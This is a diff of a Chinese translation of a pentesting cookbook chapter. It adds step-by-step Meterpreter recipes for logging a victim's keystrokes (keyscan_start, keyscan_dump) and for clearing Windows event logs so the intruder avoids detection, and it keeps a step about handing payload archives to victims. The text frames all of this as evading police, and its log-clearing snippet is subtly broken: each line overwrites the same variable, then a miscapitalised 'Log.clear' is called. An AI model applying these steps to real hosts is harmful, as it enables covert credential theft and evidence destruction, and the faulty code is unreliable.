@@ -82,7 +82,7 @@
 
 让我们在 Meterpreter shell 中开始执行本地提权攻击。你需要使用 Metasploit 攻击某个主机来获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得主机的访问。
 
-1.  一旦你通过 Metasploit  获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
 
     ![](img/7-2-1.jpg)
 
@@ -116,7 +116,7 @@
 
 掌握 SET 的步骤如下所示。
 
-1.  打开终端窗口，通过按下终端图表，并访问 SET 所在的目录：
+1.  打开终端窗口，通过按下终端图标，并访问 SET 所在的目录：
 
     ```
     se-toolkit
@@ -223,3 +223,109 @@
     ```
     
 5.  既然你已经拥有了 ZIP 归档，你可以把文件以多种方式分发给受害者。你可以通过电子邮件来传递，也可以放进 U 盘并手动在受害者机器中打开，以及其它。探索这些机制会给你想要的结果来达成你的目标。
+
+## 7.4 收集受害者数据
+
+这个秘籍中，我们会探索如何使用 Metasploit 来收集受害者的数据。有几种方式来完成这个任务，但是我们会探索在目标机器上记录用户击键顺序的方式。收集受害者数据可以让我们获得潜在的额外信息，我们可以将其用于进一步的攻击中。对于我们的例子，我们会收集目标主机上用户输入的击键顺序。
+
+### 准备
+
+为了执行这个秘籍，我们需要：
+
++ 内部网络或互联网的连接。
+
++ 使用 Metasploit 框架的具有漏洞的主机。
+
+### 操作步骤
+
+让我们开始通过 Meterpreter  shell 来收集受害者数据。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。
+
+1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+
+    ![](img/7-4-1.jpg)
+    
+2.  下面，我们执行下面的命令来开启键盘记录器：
+
+    ```
+    keyscan_start
+    ```
+    
+    ![](img/7-4-2.jpg)
+    
+3.  最后，我们输入` keyscan_dump`命令，将用户的击键顺序输出到屏幕上。
+
+    ```
+    keyscan_dump
+    ```
+    
+### 工作原理
+
+这个秘籍中，我们使用 Meterpreter 收集了受害者的数据。
+
+### 更多
+
+有一种不同的方式，你可以使用它们来收集受害者机器上的数据。这个秘籍中，我们使用了 Metasploit 和 Metasploit keyscan 来记录击键顺序，但是我们也可以使用 Wireshark 或 airodump-ng 来更简单地收集数据。
+
+这里的关键是探索其它工具，便于你找到最喜欢的工具来完成你的目标。
+
+## 7.5 清理踪迹
+
+这个秘籍中，我们会使用 Metasploit 来清除我们的踪迹。在黑进主机之后执行清理是个非常重要的步骤，因为你不想在经历所有麻烦来获得访问权限之后还被人查水表。幸运的是，Metasploit 拥有一种方式来非常简单地清除我们的踪迹。
+
+### 准备
+
+为了执行这个秘籍，我们需要：
+
++ 内部网络或互联网的连接。
+
++ 使用 Metasploit 框架的具有漏洞的主机。
+
+### 操作步骤
+
+需要执行步骤如下所示：
+
+1.  让我们开始使用  Meterpreter shell 来清理我们的踪迹。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+
+    ![](img/7-5-1.jpg)
+    
+2.  下面，我们需要运行 IRB，以便进行日志移除操作。我们打开帮助文件：
+
+    ```
+    irb
+    ```
+    
+    ![](img/7-5-2.jpg)
+    
+3.  下面，我们告诉 IRB 要移除哪个文件。下面是一个可用的选择：
+
+    ```
+    log = client.sys.eventlog.open('system') 
+    log = client.sys.eventlog.open('security') 
+    log = client.sys.eventlog.open('application') 
+    log = client.sys.eventlog.open('directory service') 
+    log = client.sys.eventlog.open('dns server') 
+    log = client.sys.eventlog.open('file replication service')
+    ```
+    
+4.  出于我们的目的，我们把它们都清理掉。你需要将这些一次键入：
+
+    ```
+    log = client.sys.eventlog.open('system') 
+    log = client.sys.eventlog.open('security') 
+    log = client.sys.eventlog.open('application') 
+    log = client.sys.eventlog.open('directory service') 
+    log = client.sys.eventlog.open('dns server') 
+    log = client.sys.eventlog.open('file replication service')
+    ```
+    
+5.  现在我们执行命令来清理日志文件：
+
+    ```
+    Log.clear 
+    ```
+    
+6.  这就结束了。我们只用了这么少的命令就能清理我们的踪迹。
+
+### 工作原理
+
+这个秘籍中，我们使用 Meterpreter  来清理我们在目标主机上的踪迹。我们从 Meterpreter 中开始这个秘籍，并启动了 IRB（一个 Ruby 解释器 shell）。下面，我们指定了想要清理的文件，并且最后键入了`Log.clear `命令来清理日志。要记住，一旦我们黑进了某个主机，你需要在最后执行这一步。你不能在清理踪迹之后再执行更多的操作，这样只会更加更多的日志条目。
